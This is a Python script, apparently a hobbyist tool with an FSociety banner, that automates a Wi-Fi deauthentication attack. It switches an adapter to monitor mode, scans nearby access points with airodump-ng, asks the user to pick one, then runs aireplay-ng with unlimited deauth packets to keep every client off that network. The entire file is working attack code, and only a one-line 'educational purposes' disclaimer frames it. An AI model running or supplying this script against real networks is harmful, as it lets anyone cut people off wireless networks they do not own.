#!/usr/bin/env python3
# Disclaimer: This script is for educational purposes only. Do not use against any network that you don't own or have authorization to test.

import subprocess
import re
import csv
import os
import time
import shutil
import logging
from datetime import datetime

# Logging configuration
logging.basicConfig(filename='network_attack.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Create a list to store active wireless networks
active_wireless_networks = []

def check_for_essid(essid, lst):
    return all(essid not in item["ESSID"] for item in lst)

def clear_screen():
    subprocess.call("clear", shell=True)

def print_header():
    header = r"""
     _______  _______  _______  _______  _______  _______  __
    (  ____ \(  ____ \(  ___  )(       )(  ____ \(  ___  )(  )
    | (    \/| (    \/| (   ) || () () || (    \/| (   ) ||  |
    | (____  | (__    | |   | || || || || (__    | |   | ||  |
    (_____ \ |  __)   | |   | || |(_)| ||  __)   | |   | ||  |
          ) )| (      | |   | || |   | || (      | |   | ||  |
    /\____) )| (____/\| (___) || )   ( || (____/\| (___) ||  |
    \______/ (_______/(_______)|/     \|(_______/(_______)(__)
    """
    print(header)
    print("\n****************************************************************")
    print("\n* FSociety Copyright of xxxxx, 2024                              *")
    print("\n* https://www.xxxxxx.com                                  *")
    print("\n* https://www.youtube.com/xxxxx                            *")
    print("\n****************************************************************")

def check_sudo_privileges():
    if 'SUDO_UID' not in os.environ.keys():
        print("Try running this program with sudo.")
        logging.error("Script not run with sudo privileges.")
        exit()

def clean_csv_files():
    for file_name in os.listdir():
        if ".csv" in file_name:
            print("Found .csv files in your directory. Moving them to the backup directory.")
            directory = os.getcwd()
            backup_dir = os.path.join(directory, "backup")
            os.makedirs(backup_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            shutil.move(file_name, os.path.join(backup_dir, f"{timestamp}-{file_name}"))
            logging.info(f"Moved {file_name} to {backup_dir}")

def get_wifi_interfaces():
    wlan_pattern = re.compile("^wlan[0-9]+")
    iwconfig_result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
    interfaces = wlan_pattern.findall(iwconfig_result)
    logging.info(f"Found WiFi interfaces: {interfaces}")
    return interfaces

def select_wifi_interface(interfaces):
    print("The following WiFi interfaces are available:")
    for index, iface in enumerate(interfaces):
        print(f"{index} - {iface}")
    
    while True:
        choice = input("Please select the interface you want to use for the attack: ")
        try:
            selected_iface = interfaces[int(choice)]
            logging.info(f"Selected WiFi interface: {selected_iface}")
            return selected_iface
        except (IndexError, ValueError):
            print("Invalid choice. Please select a valid number from the list.")
            logging.warning(f"Invalid choice: {choice}")

def kill_conflicting_processes():
    print("Killing conflicting processes:")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
    logging.info("Killed conflicting processes")

def set_monitor_mode(interface):
    print("Putting WiFi adapter into monitor mode:")
    subprocess.run(["sudo", "airmon-ng", "start", interface], stdout=subprocess.DEVNULL)
    logging.info(f"Set {interface} to monitor mode")

def discover_access_points(interface):
    subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", f"{interface}mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    logging.info("Started airodump-ng to discover access points")

def scan_networks():
    try:
        while True:
            clear_screen()
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_file:
                        csv_file.seek(0)
                        csv_reader = csv.DictReader(csv_file)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID" or row["BSSID"] == "Station MAC":
                                continue
                            if check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, network in enumerate(active_wireless_networks):
                print(f"{index}\t{network['BSSID']}\t{network['channel'].strip()}\t\t{network['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\nReady to make a choice.")
        logging.info("Scanning stopped by user")

def select_target_network():
    while True:
        choice = input("Please select a choice from above: ")
        try:
            selected_network = active_wireless_networks[int(choice)]
            logging.info(f"Selected target network: {selected_network}")
            return selected_network
        except (IndexError, ValueError):
            print("Invalid choice. Please try again.")
            logging.warning(f"Invalid network choice: {choice}")

def deauthenticate_clients(bssid, channel, interface):
    print(f"Changing to channel {channel} and deauthenticating clients on BSSID {bssid}")
    subprocess.run(["airmon-ng", "start", f"{interface}mon", channel], stdout=subprocess.DEVNULL)
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, f"{interface}mon"], stdout=subprocess.DEVNULL)
    logging.info(f"Deauthenticating clients on BSSID {bssid} on channel {channel}")

def main():
    print_header()
    check_sudo_privileges()
    clean_csv_files()
    wifi_interfaces = get_wifi_interfaces()
    
    if not wifi_interfaces:
        print("No WiFi adapter connected. Please connect a WiFi adapter and try again.")
        logging.error("No WiFi adapter connected.")
        exit()

    selected_interface = select_wifi_interface(wifi_interfaces)
    kill_conflicting_processes()
    set_monitor_mode(selected_interface)
    discover_access_points(selected_interface)
    scan_networks()

    target_network = select_target_network()
    deauthenticate_clients(target_network["BSSID"], target_network["channel"].strip(), selected_interface)

if __name__ == "__main__":
    main()
